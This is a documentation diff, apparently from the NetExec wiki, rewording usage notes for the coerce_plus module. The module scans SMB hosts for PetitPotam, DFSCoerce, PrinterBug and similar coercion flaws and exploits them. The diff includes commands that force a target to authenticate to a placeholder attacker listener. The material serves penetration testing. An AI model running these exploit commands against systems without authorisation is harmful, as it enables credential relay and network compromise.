@@ -26,34 +26,34 @@ Or, try them all at once! Just list each one: `-M zerologon -M petitpotam`
 
 # Scan for Coerce Vulnerabilities
 
-You can check coerce vulnerabilities like Petitpotam, DFSCoerce, PrinterBug, MSEven, ShadowCoerce with the coerce_plus module.
+You can check for coerce vulnerabilities such as Petitpotam, DFSCoerce, PrinterBug, MSEven, and ShadowCoerce using the coerce_plus module.
 
 `nxc smb <ip> -u '' -p '' -M coerce_plus`
 
-If you find a vulnerability, you can use the `coerce_plus` module to exploit it.
+If a vulnerability is found, you can exploit it by using the same coerce_plus module
 
 `nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>`
 
-If you want use all exploit methods add `ALWAYS=true` option.
+To run all exploit methods at once, add the ALWAYS=true option
 
 `nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true`
 
-You can also use the `coerce_plus` module to check for one coerce method.
+You can also check for a specific coerce method by specifying it
 
 `nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam`
 
 {% hint style="success" %}
-Instead of the 'METHOD' option you can use 'M'. Also the short name 'L' instead of the 'LISTENER' argument.
+Instead of using the METHOD option, you can use its short form M. Similarly, the argument LISTENER can be shortened to L.
 
-This also applies to the names of vulnerabilities in the method.
+This also applies to the names of the vulnerabilities when specifying a method.
 
--M=p // Invalid, as both petitpotam and printerbug start with ‘p’ so modules gives error
+M=p // Invalid, as both petitpotam and printerbug start with ‘p’ so modules gives error
 
--M=pr // Matches printerbug
+M=pr // Matches printerbug
 
--M=pe // Matches petitpotam
+M=pe // Matches petitpotam
 
--M=dfs // Matches dfscoerce
+M=dfs // Matches dfscoerce
 
 {% endhint %}
 
